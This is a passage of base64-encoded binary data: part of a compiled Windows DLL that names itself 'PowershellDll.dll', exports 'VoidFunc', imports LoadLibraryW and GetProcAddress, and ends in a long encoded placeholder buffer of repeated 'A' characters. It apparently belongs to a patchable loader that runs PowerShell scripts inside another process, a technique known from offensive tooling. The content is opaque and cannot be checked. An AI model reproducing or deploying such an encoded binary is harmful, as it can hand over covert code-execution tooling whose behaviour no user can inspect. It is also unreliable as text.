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AAAAAAAAAAAAQAAAAAAAAgAgAAAAAAACAFgAAAAAAAIAGAAAAAAAAgAIAAAAAAACAGgAAAAAAAIAVAAAAAAAAgA8AAAAAAACAmwEAAAAAAIAJAAAAAAAAgAAAAAAAAAAAYlkAAAAAAABsWQAAAAAAAExZAAAAAAAAhFkAAAAAAACcWQAAAAAAALZZAAAAAAAANlkAAAAAAAAAAAAAAAAAABZaAAAAAAAAHloAAAAAAAAoWgAAAAAAAAAAAAAAAAAANFoAAAAAAAD6WgAAAAAAAE5aAAAAAAAAYFoAAAAAAAB6WgAAAAAAALhaAAAAAAAA1FoAAAAAAADsWgAAAAAAAEBaAAAAAAAAnFoAAAAAAAAAAAAAAAAAAPpZAAAAAAAA6FkAAAAAAAAAAAAAAAAAAKsDTG9hZExpYnJhcnlXAACkAkdldFByb2NBZGRyZXNzAABLRVJORUwzMi5kbGwAAE9MRUFVVDMyLmRsbAAADgBfX0N4eEZyYW1lSGFuZGxlcjMAAAEAX0N4eFRocm93RXhjZXB0aW9uAAA+AG1lbXNldAAACABfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAIQBfX3N0ZF9leGNlcHRpb25fY29weQAAIgBfX3N0ZF9leGNlcHRpb25fZGVzdHJveQAlAF9fc3RkX3R5cGVfaW5mb19kZXN0cm95X2xpc3QAAFZDUlVOVElNRTE0MC5kbGwAAAAAX19hY3J0X2lvYl9mdW5jAAcAX19zdGRpb19jb21tb25fdmZ3cHJpbnRmAAAYAGZyZWUAABkAbWFsbG9jAAAIAF9jYWxsbmV3aAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9lAD8AX3NlaF9maWx0ZXJfZGxsABgAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAAMwBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADQAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA8AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHgBfY3J0X2F0ZXhpdAAWAF9jZXhpdAAAYXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1oZWFwLWwxLTEtMC5kbGwAAGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbABWAkdldExhc3RFcnJvcgAA1ANNdWx0aUJ5dGVUb1dpZGVDaGFyALUDTG9jYWxGcmVlAK4EUnRsQ2FwdHVyZUNvbnRleHQAtQRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAC8BFJ0bFZpcnR1YWxVbndpbmQAAJIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABSBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAPAkdldEN1cnJlbnRQcm9jZXNzAHAFVGVybWluYXRlUHJvY2VzcwAAcANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50ADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAEAJHZXRDdXJyZW50UHJvY2Vzc0lkABQCR2V0Q3VycmVudFRocmVhZElkAADdAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAFQDSW5pdGlhbGl6ZVNMaXN0SGVhZABqA0lzRGVidWdnZXJQcmVzZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHQCAAQAAAAoAAAAAAAAABAACgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAyot8tmSsAAM1dINJm1P//dZgAAAAAAAABAAAAAgAAAC8gAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAE